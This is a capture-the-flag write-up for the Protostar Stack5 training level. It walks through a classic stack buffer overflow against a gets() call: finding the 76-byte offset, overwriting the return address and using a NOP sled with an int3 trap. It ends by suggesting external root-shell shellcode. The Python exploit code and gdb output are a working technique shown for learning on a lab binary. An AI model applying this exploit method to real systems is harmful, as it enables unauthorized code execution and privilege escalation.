# Stack5
## Briefing
Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

Hints:

1. At this point in time, it might be easier to use someone elses shellcode.
2. If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger.
3. remove the int3s once your shellcode is done.
## Source Code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
## Solution
Stack5 is an actual buffer overflow exploit with shellcode.
The idea is this:
We put in, PADDING + RETURN + NOPS + SHELLCODE/TRAP.
The padding fills up the buffer until we are overwriting the return address, so we will start with that and come onto the other things.later, lets do the usual approach.
```
exploit = ''
exploit += 'A' * 64
exploit += 'BBBBCCCCDDDDEEEEFFFFGGGG'

print(exploit)
```
When feeding this to the program we get a fault at 0x45454545 again.
```
Program recieved signal SIGSEGV, Segmentation fault. 
0x45454545 in ?? ()
```
Like stack4 we now know that we can enter 76 letters until we overwrite the return address.
Our exploit now looks like this: 76 letters + RETURN + NOPS + SHELLCODE/TRAP.
Now we are going to add our NOPs and a code execution trap.
The trap, '\xcc' stops code execution completely when ran by the program, if we hit the trap it means that our code is being executed by the program, then we can simply swap the trap out for some working shellcode.
But how can we get our code to run? Well its simple, the return address runs what ever it is set too.
If we overwrite the return to the address of our trap, the return will jump there and run the trap for us, which we will be able to see in gdb.
While this exploit would work in theory, there are some issues with it.
The issues are, how do we find out the address of our trap. And also how do we know that gdb is accurate with the address. (it's not)
This is where are NOPs come in.
The NOP, (No-operation, \x90) does nothing. But think about it, if we have 100 nothing operations and a trap at the end, we only need to hit an address of a NOP with the return address and then it will do nothing until it finally reaches our code and then runs it!
We have essentially multiplied our room for error by 100!
Having a payload of length 101 now also makes it far easier to spot this payload and find out its memory address!
Now lets update our code:
```
import struct

nop = '\x90'
trap = '\xcc'
rp = 'BBBB'

exploit = ''
exploit += 'A' * 76
exploit += rp
exploit += nop * 100
exploit += trap

print(exploit)
```
Ok now lets feed this into GDB, and we see...
```
Program recieved signal SIGSEGV, Segmentation fault. 
0x42424242 in ?? ()
```
Segfault at our return address, as expected, here we can now use the `x/100x $esp` command to look into the stack and see where the nops are.
I found mine at 0xbffffd50, you should just use an address in the middle of the nops. Remember you are looking for 0x90909090, because the nop is '\x90'
now we finally plug that address into our code:
```
import struct

nop = '\x90'
trap = '\xcc'
rp = struct.pack("<L", 0xbffffd50)

exploit = ''
exploit += 'A' * 76
exploit += rp
exploit += nop * 100
exploit += trap

print(exploit)
```
The final run in gdb...
```
Program recieved signal SIGTRAP, Trace/Breakpoint trap. 
```
We have code execution! the program hit our trap!
Now you can simply swap out the trap for any shellcode you want. If you want to make a root shell because these files are SUID binaries then I like to use this one, /bin/dash http://shell-storm.org/shellcode/files/shellcode-811.php
